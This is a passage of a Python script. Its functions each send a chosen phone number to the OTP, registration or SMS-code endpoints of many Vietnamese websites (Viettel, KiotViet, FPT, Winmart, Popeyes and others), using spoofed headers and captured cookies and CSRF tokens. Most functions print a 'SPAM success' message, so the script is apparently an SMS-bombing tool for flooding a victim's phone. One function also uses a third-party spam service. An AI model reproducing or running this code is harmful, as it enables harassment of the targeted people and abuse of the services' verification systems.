_ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
}
  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',sdt)
  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
  print("executorubofood|")
def tamo(sdt):
  data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
  head = {
    "Host":"api.tamo.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json;charset=UTF-8",
    "origin":"https://www.tamo.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://www.tamo.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()
  print("executortamo|")
def thantaioi():
  headers = {
    'Host': 'api.thantaioi.vn',
    'accept-language': 'vi',
    'authorization': 'Bearer ' + tokenthantaioi ,
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'accept': '*/*',
    'origin': 'https://thantaioi.vn',
    'x-requested-with': 'mark.via.gp',
    'sec-fetch-site': 'same-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://thantaioi.vn/user/registration/reg2',
    # 'accept-encoding': 'gzip, deflate, br',
    # 'cookie': '_ym_uid=169110846991669337; _ym_d=1691108469; _fw_crm_v=dbfc3e99-4c79-4c24-8854-63cea51ea448; _gid=GA1.2.551830717.1691894331; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.282932599.1691108469; _ga_LN0QPGLCB5=GS1.2.1691894333.3.1.1691894444.0.0.0; _ga_LBS7YCVKY6=GS1.1.1691894332.3.1.1691894445.55.0.0',
}
  response = requests.get('https://api.thantaioi.vn/api/user/phone-confirmation-code', headers=headers).text
  print("executorthantaioi|")
def meta(sdt):
  data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
  head = {
    "Host":"meta.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://meta.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-origin",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://meta.vn/account/register",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
  print("|SPAM|THÀNH CÔNG|meta|")
def shopiness(sdt):
  cookies = {
    '_gcl_au': '1.1.713290776.1691278322',
    '_gid': 'GA1.2.538313268.1691278323',
    '_gat_UA-78703708-2': '1',
    '_ga': 'GA1.1.1304515259.1691278323',
    '_fbp': 'fb.1.1691278324147.1207721038',
    '_ga_P138SCK22P': 'GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  headers = {
    'Host': 'shopiness.vn',
    'Connection': 'keep-alive',
    # 'Content-Length': '63',
    'Accept': '*/*',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://shopiness.vn',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://shopiness.vn/khuyen-mai/pizza-hut-mua-1-tang-1-khi-giao-hang-tan-noi.80C793B3FC.html',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Cookie': '_gcl_au=1.1.713290776.1691278322; _gid=GA1.2.538313268.1691278323; _gat_UA-78703708-2=1; _ga=GA1.1.1304515259.1691278323; _fbp=fb.1.1691278324147.1207721038; _ga_P138SCK22P=GS1.1.1691278323.1.1.1691278362.21.0.0',
  }
  data = {
    'action': 'verify-registration-info',
    'phoneNumber': f'{sdt}',
    'refCode': '',
  }
  response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()
  print("|SPAM|THÀNH CÔNG|shopiness|")
def kiot(phone):
    cookies = {
        'AKA_A2': 'A',
        'gkvas-uuid': 'b1b6bfdd-724e-449f-8acc-f3594f1aae3f',
        'gkvas-uuid-d': '1687347271111',
        'kvas-uuid': '1fdbe87b-fe8b-4cd5-b065-0900b3db04b6',
        'kvas-uuid-d': '1687347276471',
        'kv-session': '52268693-9db7-4b7d-ab00-0f5022612bc5',
        'kv-session-d': '1687347276474',
        '_fbp': 'fb.1.1687347277057.810313564',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_563959': '1',
        '_hjSession_563959': 'eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==',
        '_hjAbsoluteSessionInProgress': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'idt42AWvO5FQ_0j25HtJ7BSoA7J',
        '_gid': 'GA1.2.1225607496.1687347277',
        '_hjSessionUser_563959': 'eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_6HE3N545ZW': 'GS1.1.1687347278.1.1.1687347282.56.0.0',
        '_ga_N9QLKLC70S': 'GS1.2.1687347283.1.1.1687347283.0.0.0',
        '_fw_crm_v': '4c8714f2-5161-4721-c213-fe417c49ae65',
        'parent': '65',
        '_ga': 'GA1.2.1568204857.1687347277',
    }

    headers = {
        'authority': 'www.kiotviet.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'AKA_A2=A; gkvas-uuid=b1b6bfdd-724e-449f-8acc-f3594f1aae3f; gkvas-uuid-d=1687347271111; kvas-uuid=1fdbe87b-fe8b-4cd5-b065-0900b3db04b6; kvas-uuid-d=1687347276471; kv-session=52268693-9db7-4b7d-ab00-0f5022612bc5; kv-session-d=1687347276474; _fbp=fb.1.1687347277057.810313564; _hjFirstSeen=1; _hjIncludedInSessionSample_563959=1; _hjSession_563959=eyJpZCI6IjI0OTRjOTA0LTEwYzQtNGVkMS04MGViLWFhZWRjZTg5Y2FmMSIsImNyZWF0ZWQiOjE2ODczNDcyNzcxNTYsImluU2FtcGxlIjp0cnVlfQ==; _hjAbsoluteSessionInProgress=1; _tt_enable_cookie=1; _ttp=idt42AWvO5FQ_0j25HtJ7BSoA7J; _gid=GA1.2.1225607496.1687347277; _hjSessionUser_563959=eyJpZCI6ImRiOGYyMzEzLTdkMzItNTNmNi1hNWUzLTA4MjU5ZTE1MTRiOCIsImNyZWF0ZWQiOjE2ODczNDcyNzcxMzIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_6HE3N545ZW=GS1.1.1687347278.1.1.1687347282.56.0.0; _ga_N9QLKLC70S=GS1.2.1687347283.1.1.1687347283.0.0.0; _fw_crm_v=4c8714f2-5161-4721-c213-fe417c49ae65; parent=65; _ga=GA1.2.1568204857.1687347277',
        'origin': 'https://www.kiotviet.vn',
        'referer': 'https://www.kiotviet.vn/dang-ky/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': '+84'+phone[1:],
        'code': 'bancainayne',
        'name': 'Cai Nit',
        'email': 'ahihi123982@gmail.com',
        'zone': 'An Giang - Huyện Châu Phú',
        'merchant': 'bancainayne',
        'username': '0972936627',
        'industry': 'Điện thoại & Điện máy',
        'ref_code': '',
        'industry_id': '65',
        'phone_input': "0338607465",
    }

    response = requests.post(
        'https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php',
        cookies=cookies,
        headers=headers,
        data=data,
    ).text
    print("|SPAM|THÀNH CÔNG|kiot|")
def fpt(phone):
  requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
def alfrescos(sdt):
  data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
  head = {
    "Host":"api.alfrescos.com.vn",
    "accept":"application/json, text/plain, */*",
    "brandcode":"ALFRESCOS",
    "devicecode":"web",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "origin":"https://alfrescos.com.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://alfrescos.com.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
  print("executoralfrescos|")
def poyeye(sdt):
  data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
  data = data.replace("sdt",sdt)
  head = {
    "Host":"api.popeyes.vn",
    "accept":"application/json",
    "x-client":"WebApp",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://popeyes.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()
  print("|SPAM|THÀNH CÔNG|poyeye|")
def vieon(sdt):
  data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
  }
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
  print("executorpoyeye|")
def tv360(sdt):
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json",
  }
  data = '{"msisdn":"sdt"}'
  data = data.replace("sdt",sdt)
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  '''if not rq["errorCode"] == 200:
    print("Lỗi 360tv")'''
def winmart(sdt):
  head = {
    "Host":"api-crownx.winmart.vn",
    "accept":"application/json",
    "authorization":"Bearer undefined",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://winmart.vn/",
    "accept-encoding":"gzip, deflate, br",
    "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
  }
  rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()
  print("|SPAM|THÀNH CÔNG|winmart|")
def fptplay(phone):
    Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
    print("|SPAM|THÀNH CÔNG|fptplay|")
def funring(sdt):
  data ='{"username": "sdt"}'.replace("sdt",sdt)
  head = {
    "Host":"funring.vn",
    "Connection":"keep-alive",
    "Accept":"*/*",
    "User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "Content-Type":"application/json",
    "X-Requested-With":"mark.via.gp",
    "Accept-Encoding":"gzip, deflate",
    "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
  }
  rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
  print("|SPAM|THÀNH CÔNG|funring|")
def apispam(phone):
  cookies = {
    '_ga': 'GA1.1.1928856259.1691039310',
    'serverChoice': 'Server-IPv1',
    '_ga_Y4RF4MF664': 'GS1.1.1691039309.1.1.1691039359.0.0.0',
  }
  headers = {
    'authority': 'crowstore.online',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1928856259.1691039310; serverChoice=Server-IPv1; _ga_Y4RF4MF664=GS1.1.1691039309.1.1.1691039359.0.0.0',
    'origin': 'https://crowstore.online',
    'referer': 'https://crowstore.online/sms.php',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
  }
  data = {
    'sodienthoai': phone,
    'ten_server': 'Server-IPv1',
    'key': 'freekey307',
  }
  response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
  print("|SPAM|THÀNH CÔNG|apispam|")
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
    print("|SPAM|THÀNH CÔNG|vietid|")
def dkvt(phone):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
    print("|SPAM|THÀNH CÔNG|dkvt")
def viettel(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
    print("|SPAM|THÀNH CÔNG|viettel|")
def appota(sdt):
  headers = {
    'Host': 'vi.appota.com',
    # 'content-length': '23',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'x-requested-with': 'XMLHttpRequest',
    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://vi.appota.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://vi.appota.com/',
    # 'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'cookie': '_gid=GA1.2.794950800.1691145824; _ga_SQM4TCSQGX=GS1.1.1691145825.1.1.1691145870.0.0.0; pay_session=eyJpdiI6IkRieTVpNm1rTVVjWElNNnNoRENVVVE9PSIsInZhbHVlIjoiVTdCSTdYQ0gyM2Z2UFlkbStCaWtldjNGdlpsSm5lRk9kNVpMbkQxTysydGNPSGhXSk9CT0xmNVhReUp4TXVkaTQ2XC9PYTZrRUZUSE1kXC9Jbm1WbTNuUT09IiwibWFjIjoiNjAxYTBhMjlhYWE0N2RiMTA3ZTg5MGZjOWNjZmVlOWM1MzNkMjhlZGI0NjNmMGYxYmVhNGI5MWM3MmZiZGU1MSJ9; _ga=GA1.2.626969575.1691145824; _gat=1; _fbp=fb.1.1691145877829.1126099989; _ga_8W5EGNGFDP=GS1.2.1691145878.1.0.1691145878.0.0.0',
  }
  data = {
    'phone_number': f'{sdt}',
  }
  response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text
  print("|SPAM|THÀNH CÔNG|appota|")
